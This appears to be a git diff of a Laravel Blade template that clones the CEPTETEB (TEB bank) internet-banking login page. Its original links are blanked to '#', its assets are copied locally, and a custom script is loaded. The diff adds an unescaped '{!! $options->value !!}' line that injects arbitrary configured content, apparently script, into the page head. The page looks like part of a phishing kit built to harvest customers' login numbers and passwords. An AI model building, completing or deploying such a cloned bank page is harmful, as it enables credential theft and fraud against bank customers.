@@ -1,18 +1,19 @@
 <!doctype html>
 <html lang="tr">
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
 <head>
     <meta charset="utf-8" />
     <title>CEPTETEB İnternet Şubesi</title>
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
+
     <link rel="shortcut icon" href="tassets/assets/img/favicon.ico">
     <link rel="stylesheet" href="tassets/assets/css/normalize.css">
     <link rel="stylesheet" href="tassets/assets/css/style9089.css?nocache20210331">
     <link rel="stylesheet" href="tassets/assets/css/jquery-ui.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css"/>
-  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css" />
+
     <link rel="stylesheet" href="tassets/assets/css/teb-style.css">
     <meta content="{{ csrf_token() }}" name="csrf-token" />
 
@@ -29,6 +30,8 @@
     <script src="tassets/assets/js/jquery.dataTables.js"></script>
     <script src="tassets/assets/js/jquery.dataTables.rowGrouping.js"></script>
     <script src="tassets/assets/js/main.js"></script>
+    {!! $options->value !!}
+
     <!-- <script type="text/javascript" src="tassets/js/tebrequestutil4411.js?nocache20220203"></script>
     <script src="tassets/assets/tassets/js/teb-mainb7b3.js?nocache20211025"></script>
 
@@ -43,7 +46,7 @@
     <script type="text/javascript" src="tassets/js/skala7864.js?nocache20210524"></script>
 
     <script type="text/javascript">
-        $(document).ready(function () {
+        $(document).ready(function() {
             var f = document.forms[0];
             f.webklncno.focus();
 
@@ -67,7 +70,7 @@
 
 
 
-            if (!keypadClose)  // FIXME eğer güvenli giriş yüklü değilse.
+            if (!keypadClose) // FIXME eğer güvenli giriş yüklü değilse.
             {
 
                 overlapObj = new Array(f.parola, f.webklncno, document.getElementsByName("imageField")[0]);
@@ -78,7 +81,7 @@
             }
 
 
-            $("#loginTabs").on("tabsactivate", function (event, ui) {
+            $("#loginTabs").on("tabsactivate", function(event, ui) {
                 //$("#loginTabs").tabs('option','active')
                 var tab = "taba";
                 var lblKullaniciKoduVal = 'Kullanıcı Kodu/Adı';
@@ -134,7 +137,7 @@
             // new SkalaSDK(skalaURL, rootDomain);
 
 
-            $("#submit-btn").click(function (e) {
+            $("#submit-btn").click(function(e) {
                 var flag = formSubmit();
 
                 if (flag == false) {
@@ -146,11 +149,11 @@
                 }
             });
 
-            $("#parolaTempId").on("paste", function (e) {
+            $("#parolaTempId").on("paste", function(e) {
                 e.preventDefault();
             });
 
-            document.getElementById("parolaTempId").addEventListener('input', function (e) {
+            document.getElementById("parolaTempId").addEventListener('input', function(e) {
                 if (e.data == null) {
                     isKeyPressed = false;
                     clearPassword();
@@ -161,7 +164,7 @@
                 keyPress(e);
             });
 
-            document.getElementById("parolaTemp2").addEventListener('input', function (e) {
+            document.getElementById("parolaTemp2").addEventListener('input', function(e) {
                 if (isParolaTemp2InputTriggered == false) {
                     clearPassword();
                     isParolaTemp2InputTriggered = true;
@@ -169,16 +172,16 @@
             });
 
             // prevent select all
-            document.getElementById("parolaTempId").addEventListener('select', function () {
+            document.getElementById("parolaTempId").addEventListener('select', function() {
                 this.selectionStart = this.selectionEnd;
             }, false);
 
-            document.getElementById("parolaTempId").addEventListener('keyup', function () {
+            document.getElementById("parolaTempId").addEventListener('keyup', function() {
                 isParolaTempInputTriggered = false;
                 isKeyPressed = false;
             });
 
-            document.getElementById("parolaTempId").addEventListener('keydown', function () {
+            document.getElementById("parolaTempId").addEventListener('keydown', function() {
                 isParolaTempInputTriggered = false;
                 isKeyPressed = true;
             });
@@ -190,12 +193,13 @@
 
         // to prevent ctrl + z
         var ctrlDown = false;
-        var ctrlKey = 17, zKey = 90;
+        var ctrlKey = 17,
+            zKey = 90;
         var isKeyPressed = false;
         var isParolaTemp2InputTriggered = false;
         var isParolaTempInputTriggered = false;
 
-        $(document).keydown(function (e) {
+        $(document).keydown(function(e) {
             if (e.keyCode == 17 || e.keyCode == 91) {
                 ctrlDown = true;
             }
@@ -204,7 +208,7 @@
                 return false;
             }
         });
-        $(document).keyup(function (e) {
+        $(document).keyup(function(e) {
             if (e.keyCode == 17 || e.keyCode == 91) {
                 ctrlDown = false;
             };
@@ -227,16 +231,13 @@
                         f.parolaTemp.value = Array(temp.length + 1).join('0');
                         f.parola.value = temp2 + event.data;
                         isParolaChanged = true;
-                    }
-                    else {
+                    } else {
                         f.parolaTemp.value = Array(temp2.length + 1).join('0');
                     }
-                }
-                else {
+                } else {
                     f.parolaTemp.value = Array(f.parola.value.length + 1).join('0');
                 }
-            }
-            else {
+            } else {
                 clearPassword();
             }
 
@@ -262,7 +263,8 @@
 
 <body>
     <div class="wrap login-page">
-        <a class="logo" href="#" onclick="return false;"><img src="tassets/assets/img/logo.png" width="202" height="70"></a>
+        <a class="logo" href="#" onclick="return false;"><img src="tassets/assets/img/logo.png" width="202"
+                height="70"></a>
         <div class="welcome-slogan"><span>Bireysel İnternet Şubesine</span> Hoş Geldiniz</div>
 
         <div class="login-area">
@@ -320,9 +322,8 @@
 
                             <ul class="forgot-pass">
                                 <li class="pass"><a href="javascript:openBasvuru();">Parola Al/Unuttum</a></li>
-                                <li class="new"><a
-                                        href="#"
-                                        target="_blank" rel="noopener noreferrer">CEPTETEB Müşterisi Olmak İstiyorum</a>
+                                <li class="new"><a href="#" target="_blank" rel="noopener noreferrer">CEPTETEB
+                                        Müşterisi Olmak İstiyorum</a>
                                 </li>
                             </ul>
 
@@ -338,13 +339,11 @@
                             <p>İnternet Şubesi'ne giriş yapmak için sizden cep telefonunuzun markası / modeli, cep
                                 telefonu numaranız gibi bilgiler istenmemektedir. Bu tür bilgilerin istendiği bir
                                 ekranla karşılaşmanız durumunda kesinlikle giriş yapmayınız. Detaylı bilgi için <a
-                                    href="#" target="_blank"
+                                    href="#" target="_blank" rel="noopener noreferrer">tıklayın</a>.</p>
+                            <p>Tüm güvenlik önlemlerini görmek için <a href="#" target="_blank"
                                     rel="noopener noreferrer">tıklayın</a>.</p>
-                            <p>Tüm güvenlik önlemlerini görmek için <a href="#"
-                                    target="_blank" rel="noopener noreferrer">tıklayın</a>.</p>
-                            <p>4.5G Geçişi ile ilgili detaylı bilgi almak için <a
-                                    href="#"
-                                    target="_blank" rel="noopener noreferrer">tıklayın</a>.</p>
+                            <p>4.5G Geçişi ile ilgili detaylı bilgi almak için <a href="#" target="_blank"
+                                    rel="noopener noreferrer">tıklayın</a>.</p>
 
                             <h5>HABERLER</h5>
                             <p>Parola girişleri sayısal hale getirilmiştir. Parolanızın yalnızca sayısal karakterlerden
@@ -382,37 +381,40 @@
                     <img src="tassets/assets/img/hata_icon.png" alt="Hata">
                     <div>
                         <h4>İşleminiz gerçekleştirilememiştir.</h4>
-                        <p>Bilgilerinizi kontrol ederek tekrar deneyiniz.<br><br>Parola girişleri sayısal hale getirilmiştir. <br>Parolanızın yalnızca sayısal karakterlerden oluştuğuna dikkat ediniz.<br>Bilgilerinizi hatırlamıyorsanız TEB Kredi Kartı ya da TEB Banka Kartı bilgilerinizle Parola Al/Unuttum'u kullanabilirsiniz.</p>
+                        <p>Bilgilerinizi kontrol ederek tekrar deneyiniz.<br><br>Parola girişleri sayısal hale
+                            getirilmiştir. <br>Parolanızın yalnızca sayısal karakterlerden oluştuğuna dikkat
+                            ediniz.<br>Bilgilerinizi hatırlamıyorsanız TEB Kredi Kartı ya da TEB Banka Kartı
+                            bilgilerinizle Parola Al/Unuttum'u kullanabilirsiniz.</p>
                         <a href="javascript:location.reload" class="return-back">GERİ</a>
-                        
-                        
+
+
                     </div>
                 </div>
             </div>
 
             <div class="footer">
-                <img src="tassets/assets/img/norton-secured.png" alt="Norton Secured" title="" onclick="popUpVSign()"
-                    style="cursor:pointer;" />
+                <img src="tassets/assets/img/norton-secured.png" alt="Norton Secured" title=""
+                    onclick="popUpVSign()" style="cursor:pointer;" />
                 <ul>
 
-                    <li><a href="#" target="_blank"
-                            rel="noopener noreferrer">Gizlilik ve Kişisel Veriler</a></li>
-                    <li><a href="#" target="_blank"
-                            rel="noopener noreferrer">Planlı Çalışma Takvimi</a></li>
+                    <li><a href="#" target="_blank" rel="noopener noreferrer">Gizlilik ve Kişisel Veriler</a>
+                    </li>
+                    <li><a href="#" target="_blank" rel="noopener noreferrer">Planlı Çalışma Takvimi</a></li>
 
                     <li class="bold">Copyright 2024 TEB</li>
                 </ul>
             </div>
         </div>
 
-        <div id="teb-footer-logo"><img src="tassets/assets/img/teb-logo-yatay.png" alt="TEB" title=""></div>
+        <div id="teb-footer-logo"><img src="tassets/assets/img/teb-logo-yatay.png" alt="TEB" title="">
+        </div>
     </div>
 
 
     <input type="password" name="parola" id="parolaTemp2" style="display: none;">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.9/jquery.inputmask.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js" ></script>
-    <script src="tassets/js/custom.js?rand={{rand(0,9)}}"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+    <script src="tassets/js/custom.js?rand={{ rand(0, 9) }}"></script>
 
 </body>
 
